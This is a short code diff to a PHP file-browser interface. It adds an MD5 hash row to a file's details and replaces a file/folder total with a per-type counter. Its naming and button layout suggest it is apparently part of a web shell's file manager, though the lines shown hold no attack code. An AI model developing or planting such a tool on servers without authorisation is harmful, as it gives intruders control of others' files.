@@ -683,7 +683,8 @@ if (!function_exists('view_file')) {
 				<tr><td>Create time</td><td>" . @date("d-M-Y H:i:s", filectime($file)) . "</td></tr>
 				<tr><td>Last modified</td><td>" . @date("d-M-Y H:i:s", filemtime($file)) . "</td></tr>
 				<tr><td>Last accessed</td><td>" . @date("d-M-Y H:i:s", fileatime($file)) . "</td></tr>
-				<tr data-path='" . html_safe($file) . "'><td colspan='2'>
+				<tr><td>MD5</td><td>" . md5_file($file) . "</td></tr>
+				<tr class='file-info-actions' data-path='" . html_safe($file) . "'><td colspan='2'>
 				<span class='navigate button' style='width:120px;'>explorer</span>
 				<span class='action button' style='width:120px;'>action</span>
 				<span class='button' style='width:120px;' onclick=\"view('" . html_safe(addslashes($file)) . "', 'raw');hide_box();\">raw</span>
@@ -802,6 +803,14 @@ if (!function_exists('show_all_files')) {
 		$output .= "</tbody><tfoot>";
 
 		$colspan = 1 + count($dir_info['extraCols']);
+		$counterInfo = '';
+		if (isset($dir_info['counter']) && is_array($dir_info['counter'])) {
+			$counterInfoArr = array();
+			foreach ($dir_info['counter'] as $key => $value) {
+				array_push($counterInfoArr, $value . ' ' . $key);
+			}
+			$counterInfo = implode(',', $counterInfoArr);
+		}
 		$output .= "<tr><td><div class='cBoxAll'></div></td><td>
 		<select id='massAction' class='colSpan'>
 		<option disabled selected>Action</option>
@@ -824,7 +833,7 @@ if (!function_exists('show_all_files')) {
 		<option disabled>------------</option>
 		</select>
 		</td><td colspan='" . $colspan . "'></td></tr>
-		<tr><td></td><td colspan='" . ++$colspan . "'>" . $dir_info['totalFiles'] . " file(s), " . $dir_info['totalFolders'] . " Folder(s)<span class='xplSelected'></span></td></tr>
+		<tr><td></td><td colspan='" . ++$colspan . "'>" . $counterInfo . "<span class='xplSelected'></span></td></tr>
 		";
 		$output .= "</tfoot></table>";
 		return $output;
